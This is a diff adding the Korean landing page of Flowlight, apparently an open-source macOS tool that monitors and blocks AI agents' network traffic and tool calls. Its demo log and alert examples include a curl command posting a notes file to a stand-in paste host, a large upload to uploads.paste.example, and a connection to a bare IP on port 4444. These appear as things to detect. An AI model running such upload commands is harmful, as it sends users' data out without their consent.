@@ -1,0 +1,529 @@
+<!--
+title: macOS용 Flowlight
+description: Flowlight는 어떤 앱이 어디로 연결하는지 보여주는 macOS용 오픈 소스 네트워크 도구입니다. AI 에이전트와 그 도구, MCP 서버는 더 자세히 들여다봅니다.
+nav: home
+-->
+<main id="main">
+  <section class="hero">
+    <div class="wrap">
+      <div>
+        <p class="eyebrow">앱 단위 네트워크 인텔리전스 · macOS 15+</p>
+        <h1 style="margin-top:16px">앱이 무엇을 하는지 봅니다.<br><span class="flow">AI 에이전트를 이해합니다.</span></h1>
+        <p class="lede">Flowlight는 어떤 앱이 연결하고, 어디로 가고, 데이터를 얼마나 옮기는지 보여줍니다. AI 에이전트라면 도구와
+          MCP 서버, 목적지까지 따라가므로 낯선 호스트와 민감한 채널, 이상한 업로드가 눈에 띕니다.</p>
+        <div class="cta">
+          <a class="btn btn-primary" href="{{dmg}}">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 4v11m0 0-4.5-4.5M12 15l4.5-4.5M5 20h14"/></svg>
+            macOS용 다운로드
+          </a>
+          <a class="btn btn-ghost" href="https://github.com/{{repo}}">
+            <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 .5a11.5 11.5 0 0 0-3.64 22.41c.58.1.79-.25.79-.56v-2c-3.2.7-3.88-1.37-3.88-1.37-.52-1.33-1.28-1.69-1.28-1.69-1.05-.72.08-.7.08-.7 1.16.08 1.77 1.19 1.77 1.19 1.03 1.77 2.7 1.26 3.36.96.1-.75.4-1.26.73-1.55-2.56-.29-5.25-1.28-5.25-5.69 0-1.26.45-2.29 1.19-3.1-.12-.29-.52-1.46.11-3.05 0 0 .97-.31 3.17 1.18a11 11 0 0 1 5.77 0c2.2-1.49 3.17-1.18 3.17-1.18.63 1.59.23 2.76.11 3.05.74.81 1.19 1.84 1.19 3.1 0 4.42-2.7 5.4-5.27 5.68.41.36.78 1.06.78 2.14v3.17c0 .31.21.67.8.56A11.5 11.5 0 0 0 12 .5Z"/></svg>
+            GitHub에 스타 주기
+          </a>
+          <p class="brew"><code>brew install --cask xinbetween/tap/flowlight</code><button type="button" class="copy" data-copy="brew install --cask xinbetween/tap/flowlight">복사</button></p>
+          <p class="meta-row"><span>v{{version}}</span><span>macOS 15+</span><span>유니버설</span><span>GPL-3.0</span><span>텔레메트리 없음</span></p>
+        </div>
+      </div>
+
+      <div class="log" role="img" aria-label="Flowlight 실시간 연결 로그 예시: 앱과 도메인별 트래픽, 규칙이 거부한 연결, 도구를 걷어낸 에이전트 가드레일, 피어 투 피어 Wi-Fi로 나간 AirDrop, 그리고 모의 응답">
+        <div class="log-head"><span class="dot"></span><span class="dot"></span><span class="dot"></span>
+          <span style="margin-left:8px">연결</span><span class="live"><span class="pulse"></span>실시간</span></div>
+        <ol id="log">
+          <li><span class="app">claude</span><span class="dest"><b>api.anthropic.com</b> · https:443</span><span class="bytes up">↑ 1.4 MB</span></li>
+          <li class="tool"><span class="app"></span><span class="note">↳ Bash: curl -s paste.example/up -d @notes.txt</span></li>
+          <li class="block"><span class="app">claude › curl</span><span class="dest"><b>paste.example</b> · https:443</span><span class="bytes up">거부됨</span>
+            <span class="note">⛔ 규칙 “Claude Code는 paste.example에 접근 금지”</span></li>
+          <li><span class="app">Chrome</span><span class="dest"><b>www.youtube.com</b> · quic:443</span><span class="bytes down">↓ 9.2 MB</span></li>
+          <li class="flag"><span class="app">codex</span><span class="dest"><b>uploads.paste.example</b> · https:443</span><span class="bytes up">↑ 180 MB</span>
+            <span class="note">⚠ 유출: 1시간 동안 AI 외 호스트로 180 MB</span></li>
+          <li class="p2p"><span class="app">sharingd</span><span class="dest"><b>AirDrop · 근처 기기</b> · awdl0</span><span class="bytes up">↑ 4.1 GB</span></li>
+          <li class="guard"><span class="app">claude</span><span class="dest"><b>api.anthropic.com</b> · tools/list</span><span class="bytes down">도구 −3개</span>
+            <span class="note">🛡 가드레일: Bash, Write, Edit 미제공</span></li>
+          <li><span class="app">Slack</span><span class="dest"><b>wss-primary.slack.com</b> · websocket</span><span class="bytes down">↓ 120 KB</span></li>
+          <li class="flag"><span class="app">claude</span><span class="dest"><b>smtp.relay.example</b> · smtp:587</span><span class="bytes up">↑ 2.4 MB</span>
+            <span class="note">⚠ 에이전트가 이메일 사용(SMTP submission)</span></li>
+          <li class="mock"><span class="app">Cursor</span><span class="dest"><b>api2.cursor.sh</b> · POST /v1/chat</span><span class="bytes down">503</span>
+            <span class="note">✎ Flowlight가 응답, 서버로는 전송 안 됨</span></li>
+        </ol>
+      </div>
+    </div>
+  </section>
+
+  <section class="shot" aria-label="스크린샷">
+    <div class="wrap">
+      <div class="frame"><img src="{{root}}assets/screenshots/agents.png" width="1600" height="1075"
+        alt="Flowlight의 AI 에이전트 뷰. Claude Code, Cursor, Codex, Python 스크립트가 각자의 AI 제공업체, 다른 곳으로 보낸 트래픽, 그리고 SMTP, SSH, FTP, 대용량 업로드, 원시 IP에 대한 위험 배지와 함께 나열되어 있습니다."></div>
+      <p class="caption">AI 에이전트 뷰: 각 에이전트의 모델 제공업체, 그리고 그 밖에 통신한 모든 곳. 데모 데이터로 표시했습니다.</p>
+    </div>
+  </section>
+  <section class="band" id="use-cases">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">Flowlight를 켜게 되는 순간</p>
+        <h2>몇 초면 답이 나오는 질문들</h2>
+      </div>
+      <div class="cases">
+        <div class="case"><span class="view">AI 에이전트</span><h3>회의 중인데 에이전트가 계속 돌고 있습니다</h3>
+          <p>모델 제공업체 말고 에이전트와 그 도구가 닿은 호스트를 전부 확인하고, 허용 목록을 벗어나거나 이메일을 보내거나 처음 보는 곳에 100&nbsp;MB를 올리면 알림을 받습니다.</p></div>
+        <div class="case"><span class="view">보고서</span><h3>업로드가 치솟았는데 이유를 모릅니다</h3>
+          <p>치솟은 구간에 포인터를 올려 어떤 앱인지 보고, 클릭해 시간 단위에서 분 단위로 확대한 뒤 정확한 도메인과 IP까지 따라갑니다.</p></div>
+        <div class="case"><span class="view">알림</span><h3>새 앱이 어딘가로 연락을 시작했습니다</h3>
+          <p>새 도메인에 대한 첫 연결, 비표준 포트, 트래픽 급증은 각각 알림을 띄우며, 앱 이름과 기준을 넘긴 수치를 함께 알려줍니다.</p></div>
+        <div class="case"><span class="view">실시간</span><h3>지금 무언가가 회선을 가득 채우고 있습니다</h3>
+          <p>1초마다 갱신되는 상위 사용 앱, 앱별로 가장 바쁜 목적지, 그리고 메뉴 막대의 실시간 속도.</p></div>
+        <div class="case"><span class="view">보고서</span><h3>이번 달 핫스팟 데이터가 사라졌습니다</h3>
+          <p>월 단위 보기로 바꾸고 앱으로 묶으세요. 가장 많이 쓴 앱이 맨 윗줄에 오고, 증빙이 필요하면 CSV로 내보낼 수 있습니다.</p></div>
+        <div class="case"><span class="view">보고서 · 목적지</span><h3>데이터가 어디로 가는지 감사해야 합니다</h3>
+          <p>목적지로 묶으면 한 도메인과 통신하는 모든 앱이 보이고, IP로 묶으면 그 주소 뒤에 무엇이 있는지 보입니다.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="band" id="views">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">앱 속으로</p>
+        <h2>여덟 개의 뷰, 질문도 여덟 개</h2>
+      </div>
+      <div class="views">
+        <div class="view-card"><span class="glyph live"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 12h4l3-8 4 16 3-8h4"/></svg></span>
+          <h3>실시간</h3><p>지금 무엇이 움직이나? 앱별 속도, 지난 2분, 가장 바쁜 목적지.</p><span class="keys">⌘1</span></div>
+        <div class="view-card"><span class="glyph ai-agents"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10.5 4.5l1.7 4.8L17 11l-4.8 1.7-1.7 4.8-1.7-4.8L4 11l4.8-1.7z"/><path d="M18 14.5l.8 2.2 2.2.8-2.2.8-.8 2.2-.8-2.2-2.2-.8 2.2-.8z"/></svg></span>
+          <h3>AI 에이전트</h3><p>에이전트가 모델을 부르는 것 말고 무엇을 하나? 제공업체, 다른 호스트, 위험 배지.</p><span class="keys">⌘2</span></div>
+        <div class="view-card"><span class="glyph reports"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 20V10M10 20V4M16 20v-7M22 20H2"/></svg></span>
+          <h3>보고서</h3><p>다 어디로 갔나? 초에서 연까지, 앱·목적지·IP로 묶어 차트와 CSV로.</p><span class="keys">⌘3</span></div>
+        <div class="view-card"><span class="glyph alerts"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3 2 20h20L12 3z"/><path d="M12 10v4M12 17.5v.01"/></svg></span>
+          <h3>알림</h3><p>무엇이 이상했나? 목적지와 임계값까지 밝히는, 설명되는 앱별 알림.</p><span class="keys">⌘4</span></div>
+        <div class="view-card"><span class="glyph rules"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 11V6a2 2 0 0 1 4 0v5M9 11V4a2 2 0 0 1 4 0v7M13 11V6a2 2 0 0 1 4 0v8"/><path d="M17 11v3a5 5 0 0 1-5 5h-1a6 6 0 0 1-6-6v-2"/></svg></span>
+          <h3>규칙</h3><p>무엇을 거부했고, 실제로 막히고 있나? 모든 규칙과 각 규칙이 막은 것, 그리고 모든 판정의 기록.</p><span class="keys">⌘5</span></div>
+        <div class="view-card"><span class="glyph ask"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12a8 8 0 0 1-8 8H7l-4 3v-5.5A8 8 0 1 1 21 12z"/></svg></span>
+          <h3>질문</h3><p>평소 쓰는 말로 묻고 기록에서 답을 받습니다. 실행된 질의는 아래에 전부 표시됩니다.</p><span class="keys">⌘7</span></div>
+        <div class="view-card"><span class="glyph devices"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 9a10 10 0 0 1 14 0M8 12.5a6 6 0 0 1 8 0M11 16h2"/></svg></span>
+          <h3>기기</h3><p>Bluetooth와 USB: 무엇이 페어링되고 무엇이 연결됐으며 언제 바뀌었나. 직접 켜기 전까지는 끔.</p><span class="keys">⌘8</span></div>
+        <div class="view-card"><span class="glyph inspect"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="4" width="18" height="12" rx="2"/><path d="M8 20h8M12 16v4"/><path d="M10 10a2 2 0 1 1 4 0v1"/></svg></span>
+          <h3>검사</h3><p>선택 사항. 에이전트가 실제로 무엇을 보냈고, 어떤 도구 호출이 그렇게 했나? 복호화된 요청, 도구 호출, 결과.</p><span class="keys">⌘6</span></div>
+      </div>
+    </div>
+  </section>
+
+
+  <section class="band" id="capture">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">캡처</p>
+        <h2>앱 단위로 보이는 네트워크</h2>
+        <p class="lede">Flowlight는 관측된 TCP·UDP 활동을 앱에 귀속시키고 목적지와 프로토콜, 바이트 수를 Mac 안에
+          기록합니다. 다루는 범위는 선택한 캡처 소스와 알아낼 수 있는 호스트 이름 정보에 따라 달라집니다.</p>
+      </div>
+      <div class="pair">
+        <div class="fact">
+          <span class="figure">앱 단위로</span>
+          <p>앱과 명령줄 도구, 백그라운드 서비스를 프로세스 기준으로 귀속시킵니다. 인식된 에이전트의 하위 프로세스도 포함합니다.</p>
+        </div>
+        <div class="fact">
+          <span class="figure">알아낸 호스트 이름</span>
+          <p>관측된 TLS 서버 이름과 DNS 응답에서 알아냅니다. 호스트 이름을 알 수 없을 때는 선택에 따라 Flowlight가 네트워크 소유자를 확인할 수 있습니다.</p>
+        </div>
+        <div class="fact">
+          <span class="figure">1초 <small>→ 1년</small></span>
+          <p>초에서 연까지 확대·축소합니다. 앱으로, 목적지로, IP로 묶어 보세요. 치솟은 구간에 포인터를 올리면 어떤 앱인지 나옵니다.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="band" id="agents">
+    <div class="wrap agents">
+      <div class="section-head" style="margin:0">
+        <p class="eyebrow">AI 에이전트 감시</p>
+        <h2>AI 에이전트가 네트워크를 어떻게 쓰는지 봅니다</h2>
+        <p class="lede">Flowlight는 에이전트 {{agents}}종을 이름으로 인식하고, 알려진 LLM API 제공업체 {{providers}}곳 중 하나에
+          접속하는 다른 프로세스를 분류합니다. 브라우저 트래픽은 자동 에이전트 분류에서 제외됩니다.</p>
+        <div class="agent-list" aria-label="인식하는 에이전트">
+          <span class="chip">Claude Code</span><span class="chip">Codex</span><span class="chip">Cursor</span>
+          <span class="chip">Windsurf</span><span class="chip">GitHub Copilot</span><span class="chip">Gemini CLI</span>
+          <span class="chip">Aider</span><span class="chip">Goose</span><span class="chip">OpenCode</span>
+          <span class="chip">Ollama</span><span class="chip">LM Studio</span><span class="chip">ChatGPT</span>
+          <span class="chip">Claude</span><span class="chip">Zed</span><span class="chip">Perplexity</span><span class="chip">ZCode</span>
+          <span class="chip">+ LLM API를 호출하는 모든 것</span>
+        </div>
+      </div>
+      <div class="rules">
+        <div class="rule">
+          <span class="sev critical">⚠ 심각</span>
+          <div><h3>허용 목록 위반</h3>
+            <p>“Claude Code는 GitHub와 npm까지만, 나머지는 안 됨.” 도메인이나 IP, 대역을 추가하거나 사전 설정에서 시작하세요.
+              그 밖의 곳은 알림을 띄우고 <b>허용</b> 버튼 한 번으로 풀 수 있으며, 요청하면 네트워크 확장이
+              보고만 하지 않고 연결을 거부합니다.</p>
+            <p class="example">Claude Code › curl이 paste.example:443에 접속했지만 Claude Code의 허용 목록에 없습니다</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev critical">⛔ 거부</span>
+          <div><h3>원하는 기간만큼만 사는 규칙</h3>
+            <p>앱이든 에이전트든, 목적지든 URL 하나든 지정해서 막으세요. 발견한 행에서 오른쪽 클릭하면 됩니다.
+              영구히, 특정 시각까지, Flowlight를 종료할 때까지, 또는 정해 둔 시간대에만. 일시 정지 스위치 하나와
+              모든 거부마다 빠져나갈 길이 있습니다. 가장 구체적인 규칙이 이기고, 비기면 차단이 이깁니다.</p>
+            <p class="example">Cursor ⇥ raw.githubusercontent.com · 4회 거부 · 평일 18:00–09:00</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev critical">⛔ 거부</span>
+          <div><h3>에이전트의 도구에 두는 가드레일</h3>
+            <p>MCP 서버 하나, 그 서버의 도구 하나, 리소스 하나를 막을 수 있습니다. 거부된 도구는 에이전트가 모델에게 보내는
+              목록에서 빠지므로 모델은 그 도구를 아예 받지 못합니다. 따질 거부도, 재시도 루프도 없습니다. HTTPS 검사가
+              필요하며, 이것은 샌드박스가 아닙니다. Flowlight는 아닌 척하지 않고 그렇다고 말합니다.</p>
+            <p class="example">Claude Code: Bash 금지, write* 금지 · 오늘 선언에서 도구 12개 제거</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev info">↳ 귀속</span>
+          <div><h3>도구와 MCP 서버</h3>
+            <p>에이전트의 셸 도구가 실행한 curl과 git, npm, 그리고 에이전트가 띄운 MCP 서버는 그 에이전트의 트래픽으로 집계되고, 이름은 에이전트 자신의 MCP 설정에서 가져옵니다.</p>
+            <p class="example">api.github.com · github MCP 경유 &nbsp;·&nbsp; paste.example · curl 경유</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev info">⌕ 직접 켜기</span>
+          <div><h3>모델의 응답에서 읽어낸 도구 호출</h3>
+            <p>지원되는 제공업체와 HTTPS 검사를 거치도록 지정한 앱에 대해, Flowlight는 선언된 도구와 모델이 요청한 도구 호출, 되돌아온 결과를 기록하고, 도구가 낸 네트워크 요청을 그것을 일으킨 호출과 연결할 수 있습니다.</p>
+            <p class="example">curl → paste.example:443 &nbsp;←&nbsp; Bash: curl -s https://paste.example/up -d @notes.txt</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev info">⌕ 디스크에서</span>
+          <div><h3>각 에이전트가 무엇을 하도록 설정됐나</h3>
+            <p>허락하면 Flowlight가 에이전트 자신의 설정을 읽습니다. 스킬, 서브에이전트, 슬래시 명령, 훅, 권한 규칙, MCP 서버까지. 이름만 읽고 코드는 읽지 않으며, Mac 밖으로 나가는 것은 없습니다.</p>
+            <p class="example">Notification 훅 → curl -s -d … https://ntfy.sh/… &nbsp;·&nbsp; allow: Bash(curl:*)</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev critical">⚠ 심각</span>
+          <div><h3>민감한 채널</h3>
+            <p>에이전트가 이메일을 보내거나 파일을 전송하거나 SSH 또는 원격 데스크탑을 열거나, 터널이나 프록시를 지나거나 데이터베이스와 통신합니다.</p>
+            <p class="example">Claude Code가 smtp.relay.example:587로 SMTP-SUBMISSION을 사용해 2.4 MB를 보냈습니다</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev critical">⚠ 심각</span>
+          <div><h3>유출 가능성</h3>
+            <p>AI 제공업체가 아닌 호스트로 시간당 100 MB 넘게 나갑니다.</p>
+            <p class="example">Codex가 지난 한 시간 동안 AI 외 호스트로 180 MB를 업로드했습니다: uploads.paste.example</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev warning">▲ 경고</span>
+          <div><h3>이름 없는 호스트</h3>
+            <p>호스트 이름이 없는 맨 IP 주소로, 비정상 포트로 연결합니다.</p>
+            <p class="example">python3이 호스트 이름 없이 203.0.113.45:4444(tcp)에 연결했습니다</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev warning">▲ 경고</span>
+          <div><h3>자리를 비운 사이 활동</h3>
+            <p>키보드나 마우스 입력이 15분 동안 없었는데도 데이터가 계속 움직입니다.</p>
+            <p class="example">자리를 비운 사이 Codex가 지난 1분 동안 48 MB를 옮겼습니다(37분 동안 입력 없음)</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev info">ⓘ 정보</span>
+          <div><h3>새 목적지는 더 빨리</h3>
+            <p>에이전트는 새 도메인 알림이 시작되기까지 학습 기간이 1시간입니다(다른 앱은 24시간). 모든 임계값은 조절할 수 있습니다.</p></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="band" id="protocols">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">다루는 범위</p>
+        <h2>프로토콜 108종, 13개 계열로</h2>
+        <p class="lede">포트와 회선에 처음 흐르는 바이트(TLS 핸드셰이크, HTTP 메서드, 메일과 SSH 인사말, SOCKS 요청)로
+          알아냅니다. <b style="color:var(--critical)">외부 전송 채널</b>로 표시된 계열이 에이전트 규칙이 지켜보는
+          대상입니다.</p>
+      </div>
+      <div class="families">
+        <div class="family"><header><h3>웹</h3><span class="count">9</span></header>
+          <div class="protos"><span>HTTP</span><span>HTTPS</span><span>HTTP/2</span><span>QUIC · HTTP/3</span><span>WebSocket</span><span>TLS</span><span>HTTP 프록시</span></div></div>
+        <div class="family egress"><header><h3>이메일</h3><span class="tag">외부 전송 채널</span></header>
+          <div class="protos"><span>SMTP</span><span>Submission 587</span><span>SMTPS</span><span>IMAP</span><span>IMAPS</span><span>POP3</span><span>POP3S</span></div></div>
+        <div class="family egress"><header><h3>파일 전송</h3><span class="tag">외부 전송 채널</span></header>
+          <div class="protos"><span>FTP</span><span>FTPS</span><span>TFTP</span><span>SFTP</span><span>SMB</span><span>AFP</span><span>NFS</span><span>rsync</span><span>git</span><span>svn</span></div></div>
+        <div class="family egress"><header><h3>원격 접속</h3><span class="tag">외부 전송 채널</span></header>
+          <div class="protos"><span>SSH</span><span>RDP</span><span>VNC</span><span>Telnet</span><span>TeamViewer</span></div></div>
+        <div class="family egress"><header><h3>VPN, 프록시, 터널</h3><span class="tag">외부 전송 채널</span></header>
+          <div class="protos"><span>WireGuard</span><span>OpenVPN</span><span>IPsec</span><span>L2TP</span><span>PPTP</span><span>Tailscale</span><span>SOCKS5</span><span>Tor</span></div></div>
+        <div class="family egress"><header><h3>데이터베이스와 캐시</h3><span class="tag">외부 전송 채널</span></header>
+          <div class="protos"><span>Postgres</span><span>MySQL</span><span>SQL Server</span><span>Oracle</span><span>Redis</span><span>MongoDB</span><span>Cassandra</span><span>Elasticsearch</span><span>Memcached</span></div></div>
+        <div class="family egress"><header><h3>피어 투 피어</h3><span class="tag">외부 전송 채널</span></header>
+          <div class="protos"><span>BitTorrent</span></div></div>
+        <div class="family"><header><h3>이름 확인</h3><span class="count">8</span></header>
+          <div class="protos"><span>DNS</span><span>DNS over TLS</span><span>DNS over HTTPS</span><span>DNS over QUIC</span><span>mDNS</span><span>LLMNR</span><span>NetBIOS</span><span>WHOIS</span></div></div>
+        <div class="family"><header><h3>메시징과 큐</h3><span class="count">12</span></header>
+          <div class="protos"><span>MQTT</span><span>AMQP</span><span>Kafka</span><span>NATS</span><span>XMPP</span><span>IRC</span><span>NNTP</span></div></div>
+        <div class="family"><header><h3>음성, 영상, 스트리밍</h3><span class="count">5</span></header>
+          <div class="protos"><span>SIP</span><span>SIPS</span><span>STUN</span><span>RTSP</span><span>Zoom media</span></div></div>
+        <div class="family"><header><h3>네트워크 서비스</h3><span class="count">19</span></header>
+          <div class="protos"><span>NTP</span><span>DHCP</span><span>SNMP</span><span>Syslog</span><span>SSDP</span><span>Kerberos</span><span>LDAP</span><span>IPP</span><span>BGP</span></div></div>
+        <div class="family"><header><h3>푸시와 개발</h3><span class="count">6</span></header>
+          <div class="protos"><span>APNs</span><span>FCM</span><span>Docker</span><span>Kubernetes</span><span>Ollama</span></div></div>
+      </div>
+      <p class="footnote">네트워크 확장을 켜면 Flowlight가 대상이 되는 TCP·UDP 흐름을 관측합니다. ICMP와 그 밖의 원시 IP
+        프로토콜, 일부 시스템 트래픽은 이 범위 밖입니다. 암호화된 페이로드는 앱을 HTTPS 검사로 명시적으로 보내지 않는 한 암호화된 채로 남습니다.</p>
+    </div>
+  </section>
+
+  
+  <section class="band" id="compare">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">다른 도구와 비교</p>
+        <h2>다른 도구가 지나치는 질문을 위해</h2>
+        <p class="lede">Flowlight는 지켜보고 설명하며, 요청하면 거부합니다. 목적지든 URL이든, 에이전트가 가져서는 안 될
+          도구든.</p>
+      </div>
+      <div class="table-wrap">
+        <table class="compare">
+          <thead><tr><th></th><th class="us">Flowlight</th><th>Activity Monitor</th><th>방화벽<br><small>예: Little Snitch, LuLu</small></th><th>패킷 분석기<br><small>예: Wireshark</small></th></tr></thead>
+          <tbody>
+            <tr><td>어떤 앱이 보냈나</td><td class="us yes">예</td><td class="yes">예</td><td class="yes">예</td><td class="no">아니요</td></tr>
+            <tr><td>어떤 도메인으로 갔나</td><td class="us yes">예, SNI와 DNS로</td><td class="no">아니요</td><td class="yes">예</td><td class="yes">예, 패킷 단위로</td></tr>
+            <tr><td>초에서 연까지의 기록</td><td class="us yes">예</td><td class="no">아니요</td><td class="part">제품마다 다름</td><td class="part">캡처 파일</td></tr>
+            <tr><td>AI 에이전트를 위한 규칙</td><td class="us yes">예</td><td class="no">아니요</td><td class="no">아니요</td><td class="no">아니요</td></tr>
+            <tr><td>에이전트의 도구 호출과 트래픽의 연결</td><td class="us yes">예, 직접 켜야 함</td><td class="no">아니요</td><td class="no">아니요</td><td class="no">아니요</td></tr>
+            <tr><td>연결 차단</td><td class="us yes">예, 네트워크 확장으로</td><td class="no">아니요</td><td class="yes">예</td><td class="no">아니요</td></tr>
+            <tr><td>트래픽뿐 아니라 에이전트의 도구까지 차단</td><td class="us yes">예, 직접 켜야 함</td><td class="no">아니요</td><td class="no">아니요</td><td class="no">아니요</td></tr>
+            <tr><td>무료 오픈 소스</td><td class="us yes">예, GPL-3.0</td><td class="part">기본 포함</td><td class="part">제품마다 다름</td><td class="yes">예</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <section class="band" id="about">
+    <div class="wrap about">
+      <div style="display:grid;gap:16px">
+        <p class="eyebrow">Flowlight가 있는 이유</p>
+        <blockquote>이제 도구가 스스로 결정합니다. 그럴 때 <span>내 데이터가 어디로 가는지</span> 볼 수 있어야 합니다.</blockquote>
+      </div>
+      <div class="prose">
+        <p>코딩 에이전트는 파일을 읽고 명령을 실행하고 도구를 호출하며, 그 도구는 어느 것이든 소켓을 열 수 있습니다. 2026년 9월,
+          어떤 AI 코딩 앱이 사용자의 작업 공간 전체를 Git 기록까지 묶어 백그라운드로 업로드하고 있었다는 사실이 드러났습니다.
+          이를 잡아낸 연구자도 캐시 폴더가 디스크를 잡아먹는 것을 보고서야 알아챘습니다.</p>
+        <p>업로드는 암호화되어 있었지만 정작 중요한 사실들은 그렇지 않았습니다. 어떤 앱이, 어떤 호스트로, 몇 메가바이트를, 언제.
+          macOS는 이미 그 전부를 알고 있습니다. Flowlight는 그것을 화면에 올리고 기록으로 남기며, 이상한 것을 표시합니다.</p>
+        <p><a href="{{link:about}}">전체 이야기 읽기 →</a></p>
+      </div>
+    </div>
+  </section>
+<section class="band" id="inspect">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">HTTPS 검사 · 선택 사항</p>
+        <h2>도구 호출과 네트워크 요청을 잇습니다</h2>
+        <p class="lede">기본값은 끔입니다. 켜면 Flowlight는 Mac 안에서 만든 자체 인증 기관을 가진 로컬 프록시가 됩니다.
+          검사 대상인 터미널에서 에이전트를 실행하면 에이전트와 그 도구의 지원되는 HTTP 트래픽이 복호화되고, 모델이 요청한
+          도구 호출과 되돌아간 결과가 함께 보입니다.</p>
+      </div>
+      <figure class="detail-shot"><div class="frame"><img src="{{root}}assets/screenshots/inspect.png" width="1600" height="1075" loading="lazy"
+        alt="Flowlight의 검사 뷰: 복호화된 Claude Code 요청과 각 요청의 도구 호출 목록, 그리고 curl이 paste.example로 올린 업로드의 상세 내용. 그 업로드를 실행한 Bash 도구 호출과 요청 본문에 담긴 메모가 함께 보입니다"></div>
+        <figcaption><b>내 메모는 어디로 갔나?</b> curl이 paste.example로 올린 업로드를, 모델이 요청한 Bash 명령까지 거슬러
+          올라가 보낸 본문과 함께.</figcaption></figure>
+      <div class="screens" style="margin-top:32px">
+        <figure><div class="frame"><img src="{{root}}assets/screenshots/agent-tools.png" width="1600" height="622" loading="lazy"
+          alt="Claude Code의 도구 탭: Bash, Read와 MCP 도구 두 개가 설명, 그리고 모델이 각각을 몇 번 호출했는지와 함께 나열되어 있습니다"></div>
+          <figcaption><b>에이전트가 모델에게 내주는 모든 도구.</b> 에이전트는 매 턴마다 도구를 선언하므로 Flowlight는 그것을 전부
+            나열하고, 모델이 실제로 쓴 것과 한 번도 건드리지 않은 것을 구분해 보여줍니다.</figcaption></figure>
+        <figure><div class="frame"><img src="{{root}}assets/screenshots/mcp-servers.png" width="1600" height="622" loading="lazy"
+          alt="Codex의 MCP 서버 탭: 제공업체 경유로 표시된 sentry 서버, 그 URL, 승인은 사용 안 함, 허용된 도구, 그리고 서버가 제공하는 도구들"></div>
+          <figcaption><b>회선에서는 보이지 않는 것까지.</b> 에이전트가 제공업체에게 MCP 서버로 연결해 달라고 하면 그 트래픽은
+            내 Mac을 거치지 않습니다. 하지만 요청은 거치므로 서버와 URL, 승인 설정, 제공하는 도구는 그대로 드러납니다.</figcaption></figure>
+      </div>
+      <div class="privacy" style="margin-top:32px">
+        <div><strong>도구 호출과 결과</strong><p>Anthropic, OpenAI, Gemini, MCP. 각 호출의 명령과 출력 또는 오류, 그리고 그 도구가 낸 요청까지.</p></div>
+        <div><strong>모델과 토큰</strong><p>어떤 모델이 답했는지, 호출은 몇 번인지, 그리고 입력·출력·캐시에서 제공된 토큰을 에이전트별로.</p></div>
+        <div><strong>읽을 수 있는 본문</strong><p>JSON은 원래 순서를 지키는 접이식 트리로, 스트림은 이벤트 하나씩, 헤더와 원본 보기까지.</p></div>
+        <div><strong>명시적으로 통제</strong><p>검사는 기본적으로 AI 에이전트만 대상으로 합니다. Flowlight는 내장된 Apple 서비스와 암호 관리자 목록을 제외하고, 저장하기 전에 인증 정보 헤더를 가리며, 인증서와 기록된 데이터를 지우는 동작을 하나 제공합니다.</p></div>
+      </div>
+    </div>
+  </section>
+
+<section class="band" id="roadmap">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">다음</p>
+        <h2>앞으로 올 것</h2>
+        <p class="lede">Flowlight는 지금 지켜보고 설명하고 거부합니다. 나머지는 이 순서로 만들고 있습니다.</p>
+      </div>
+      <div class="privacy">
+        <div><strong>Linux, 그다음 Windows</strong><p>분석 코어는 어디로든 옮길 수 있는 Swift이지만 캡처는 그렇지 않습니다. macOS API 대신 eBPF를 쓰고 로컬 웹 UI가 딸린 Linux 데몬이 먼저 나옵니다.</p></div>
+      </div>
+    </div>
+  </section>
+
+<section class="band" id="privacy">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">개인정보</p>
+        <h2>감시하지 않아도 되는 감시 도구</h2>
+      </div>
+      <div class="privacy">
+        <div><strong>Mac 안에 머무릅니다</strong><p>로컬 SQLite 파일 하나. 계정도, 클라우드 동기화도, 텔레메트리도 없습니다.</p></div>
